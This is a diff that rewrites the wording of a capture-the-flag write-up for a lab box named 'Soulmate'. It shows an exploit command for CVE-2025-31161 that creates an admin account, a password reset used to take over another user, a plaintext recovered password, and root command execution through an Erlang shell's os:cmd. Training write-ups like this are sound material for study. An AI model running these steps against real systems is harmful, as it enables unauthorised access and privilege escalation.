@@ -50,7 +50,7 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Oct 30 14:27:40 2025 -- 1 IP address (1 host up) scanned in 26.97 seconds
 ```
-The web application on port `80` was a dating site titled **Soulmate - Find Your Perfect Match**. The textarea was tested for XSS — not vulnerable.
+The web application on port `80` was a dating site titled **Soulmate - Find Your Perfect Match**. I tested the textarea for XSS, but it wasn't vulnerable.
 
 Subdomain enumeration with `ffuf` surfaced `ftp.soulmate.htb`:
 
@@ -70,7 +70,7 @@ Research identified **CVE-2025-31161**, an authentication bypass allowing arbitr
 python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user dante --password dante
 ```
 
-Logged in as the newly created `dante` account and navigated to **Admin → User Manager → ben**. Generated a random password for `ben`, saved it, then re-authenticated as `ben`.
+Logged in as the newly created `dante` account and navigated to **Admin → User Manager → ben**, where I generated a random password for `ben`, saved it, and re-authenticated as `ben`.
 
 `ben` held the `webProd` directory — the web root backing `soulmate.htb`, containing all the site's PHP files.
 
@@ -92,7 +92,7 @@ Process monitoring with `pspy64` revealed root periodically executing a login sc
 ben : HouseH0ldings998
 ```
 
-SSH access was obtained:
+Logged in over SSH as `ben`:
 
 ```bash
 ssh ben@<target>
@@ -110,13 +110,13 @@ Connected to the internal Erlang shell:
 ssh ben@localhost -p 2222
 ```
 
-This granted an **Eshell** — the Erlang interactive shell — authenticated as `ssh_runner`. Loaded modules and executed system commands directly:
+This granted an **Eshell** — the Erlang interactive shell — authenticated as `ssh_runner`, from which modules could be loaded and system commands executed directly:
 
 ```erlang
 m().
 os:cmd("id").
 ```
 
-The `os:cmd` call executed with root privileges. Flag captured and a stable root shell established.
+The `os:cmd` call ran with root privileges, so the flag was ours along with a stable root shell.
 
 Gained `root`
